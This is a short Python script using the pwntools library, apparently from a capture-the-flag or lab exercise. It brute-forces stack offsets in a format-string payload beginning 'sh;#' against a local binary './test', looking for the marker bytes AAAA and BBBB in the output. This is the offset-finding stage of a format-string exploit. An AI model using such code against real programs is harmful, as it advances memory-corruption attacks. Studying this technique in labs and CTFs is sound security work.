from pwn import *

for i in range(0, 200):
    payload = f"sh;#AAAABBBB%00000x%{i}$hp%00000x%{i+1}$hp"
    
    # print(payload)
    p = process(["env", "-i", "./test", payload])
    
    ret = p.recvall().decode(errors="ignore")
    
    # with open("output.txt", "a") as f:
    #     f.write(ret)
    
    if "0x41414141" in ret and "0x42424242" in ret:
        print(f"Found {i} {i+1}")
        p.close()
        break
    p.close()
else:
    print("Not found")
    exit(1)